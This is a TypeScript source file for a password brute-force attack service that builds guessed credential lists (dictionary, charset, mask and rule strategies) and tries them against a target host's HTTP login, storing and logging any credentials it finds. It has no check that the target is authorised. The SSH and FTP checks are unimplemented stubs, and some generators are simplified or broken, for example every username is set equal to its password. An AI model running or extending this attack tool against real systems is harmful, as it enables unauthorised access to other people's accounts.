import { EventEmitter } from 'events';
import { config } from '../config/env';
import logger from '../config/logger';
import { operationModel } from '../models/Operation';
import { resultModel } from '../models/Result';
import { logModel } from '../models/Log';
import axios, { AxiosInstance } from 'axios';

interface BruteForceTarget {
  protocol: string;
  host: string;
  port?: number;
  username?: string;
  path?: string;
  method?: string;
}

interface AttackConfig {
  wordlist: string[];
  strategy: 'dictionary' | 'brute_force' | 'hybrid' | 'mask' | 'rainbow_table' | 'rules';
  threads: number;
  delay: number;
  timeout: number;
}

export class BruteForceService extends EventEmitter {
  private axiosInstance: AxiosInstance;
  private activeOperations: Map<string, boolean> = new Map();
  private operationStats: Map<string, any> = new Map();

  constructor() {
    super();
    this.axiosInstance = axios.create({
      timeout: config.bruteForce.requestTimeout,
      validateStatus: () => true, // Don't throw on any status
    });
  }

  async executeOperation(
    operationId: string,
    userId: string,
    target: BruteForceTarget,
    config: AttackConfig,
  ): Promise<void> {
    try {
      // Mark operation as active
      this.activeOperations.set(operationId, true);
      this.operationStats.set(operationId, {
        totalAttempts: 0,
        successfulAttempts: 0,
        failedAttempts: 0,
        startTime: Date.now(),
      });

      // Start operation
      await operationModel.startOperation(operationId);
      await logModel.addLog('info', `Operation started: ${operationId}`, operationId, userId);

      // Generate credentials based on strategy
      const credentials = this.generateCredentials(config);

      // Execute brute force attack
      const results = await this.attackTarget(operationId, userId, target, credentials, config);

      // Mark operation as completed
      await operationModel.completeOperation(operationId);
      await logModel.addLog(
        'success',
        `Operation completed: ${results.successful} successful attempts`,
        operationId,
        userId,
        results,
      );

      this.emit('operation:completed', { operationId, results });
    } catch (error: any) {
      logger.error(`Error in brute force operation ${operationId}:`, error);
      await operationModel.updateStatus(operationId, 'failed');
      await logModel.addLog('error', error.message, operationId, userId);
      this.emit('operation:error', { operationId, error: error.message });
    } finally {
      this.activeOperations.delete(operationId);
      this.operationStats.delete(operationId);
    }
  }

  private generateCredentials(config: AttackConfig): string[][] {
    const { wordlist, strategy } = config;

    switch (strategy) {
      case 'dictionary':
        return wordlist.map((word) => [word, word]);

      case 'brute_force':
        return this.generateBruteForce(wordlist[0]?.length || 8);

      case 'hybrid':
        return [
          ...wordlist.map((word) => [word, word]),
          ...this.generateBruteForce(6).slice(0, 100),
        ];

      case 'mask':
        return this.generateMask('?u?l?l?l?d?d?d?d');

      case 'rules':
        return this.applyRules(wordlist);

      default:
        return wordlist.map((word) => [word, word]);
    }
  }

  private generateBruteForce(length: number): string[][] {
    const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const results: string[][] = [];
    const limit = Math.min(10000, Math.pow(charset.length, length));

    for (let i = 0; i < limit; i++) {
      let combination = '';
      let num = i;
      for (let j = 0; j < length; j++) {
        combination = charset[num % charset.length] + combination;
        num = Math.floor(num / charset.length);
      }
      results.push([combination, combination]);
    }

    return results;
  }

  private generateMask(mask: string): string[][] {
    const results: string[][] = [];
    const charsets: Record<string, string> = {
      '?u': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
      '?l': 'abcdefghijklmnopqrstuvwxyz',
      '?d': '0123456789',
      '?s': '!@#$%^&*()',
      '?a': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()',
    };

    // Parse mask and generate combinations
    const positions = this.parseMask(mask);
    const combinations = this.generateCombinations(positions, charsets);

    return combinations.map((combo) => [combo, combo]);
  }

  private parseMask(mask: string): any[] {
    const positions = [];
    for (let i = 0; i < mask.length; i += 2) {
      positions.push(mask.substring(i, i + 2));
    }
    return positions;
  }

  private generateCombinations(positions: any[], charsets: Record<string, string>): string[] {
    // Simplified combination generation
    const results: string[] = [];
    if (positions.length === 0) return results;

    const charset = charsets[positions[0]] || 'a';
    if (positions.length === 1) {
      return charset.split('').slice(0, 100);
    }

    return results;
  }

  private applyRules(wordlist: string[]): string[][] {
    return wordlist.map((word) => {
      const variations = [
        word,
        word.toUpperCase(),
        word.charAt(0).toUpperCase() + word.slice(1),
        word + '123',
        word + '!',
      ];
      return [variations[0], variations[Math.floor(Math.random() * variations.length)]];
    });
  }

  private async attackTarget(
    operationId: string,
    userId: string,
    target: BruteForceTarget,
    credentials: string[][],
    config: AttackConfig,
  ): Promise<any> {
    let successful = 0;
    let failed = 0;
    let attempts = 0;

    for (const [username, password] of credentials) {
      if (!this.activeOperations.get(operationId)) {
        break; // Operation was cancelled
      }

      try {
        const isValid = await this.validateCredentials(target, username, password);

        attempts++;
        if (isValid) {
          successful++;
          await resultModel.addResult(operationId, 'success', username, password);
          await logModel.addLog('success', `Found credentials: ${username}:${password}`, operationId);
        } else {
          failed++;
          if (attempts % 100 === 0) {
            await resultModel.addResult(operationId, 'attempt', username, password);
          }
        }

        // Update progress
        const progress = Math.floor((attempts / credentials.length) * 100);
        await operationModel.updateProgress(
          operationId,
          progress,
          attempts,
          successful,
          failed,
        );

        // Apply delay between attempts
        await this.delay(config.delay);
      } catch (error) {
        failed++;
        logger.debug(`Error testing credentials for ${operationId}:`, error);
      }
    }

    return {
      successful,
      failed,
      attempts,
      duration: Date.now() - (this.operationStats.get(operationId)?.startTime || Date.now()),
    };
  }

  private async validateCredentials(
    target: BruteForceTarget,
    username: string,
    password: string,
  ): Promise<boolean> {
    try {
      switch (target.protocol.toLowerCase()) {
        case 'http':
        case 'https':
          return await this.validateHttp(target, username, password);
        case 'ssh':
          return await this.validateSsh(target, username, password);
        case 'ftp':
          return await this.validateFtp(target, username, password);
        default:
          return false;
      }
    } catch (error) {
      return false;
    }
  }

  private async validateHttp(
    target: BruteForceTarget,
    username: string,
    password: string,
  ): Promise<boolean> {
    const url = `${target.protocol}://${target.host}${target.path || '/'}`;
    const method = target.method || 'POST';

    try {
      const response = await this.axiosInstance({
        method,
        url,
        auth: { username, password },
        data: { username, password },
      });

      return response.status >= 200 && response.status < 300;
    } catch {
      return false;
    }
  }

  private async validateSsh(
    target: BruteForceTarget,
    username: string,
    password: string,
  ): Promise<boolean> {
    // SSH validation would require node-ssh or similar library
    // For now, return false (not implemented yet)
    logger.debug(`SSH validation not yet implemented for ${target.host}`);
    return false;
  }

  private async validateFtp(
    target: BruteForceTarget,
    username: string,
    password: string,
  ): Promise<boolean> {
    // FTP validation would require basic-ftp or similar library
    // For now, return false (not implemented yet)
    logger.debug(`FTP validation not yet implemented for ${target.host}`);
    return false;
  }

  private delay(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  async pauseOperation(operationId: string): Promise<void> {
    await operationModel.updateStatus(operationId, 'paused');
    logger.info(`Operation paused: ${operationId}`);
  }

  async resumeOperation(operationId: string): Promise<void> {
    await operationModel.updateStatus(operationId, 'running');
    logger.info(`Operation resumed: ${operationId}`);
  }

  async cancelOperation(operationId: string): Promise<void> {
    this.activeOperations.set(operationId, false);
    await operationModel.updateStatus(operationId, 'failed');
    logger.info(`Operation cancelled: ${operationId}`);
  }

  isOperationActive(operationId: string): boolean {
    return this.activeOperations.get(operationId) || false;
  }

  getOperationStats(operationId: string): any {
    return this.operationStats.get(operationId);
  }
}

export const bruteForceService = new BruteForceService();
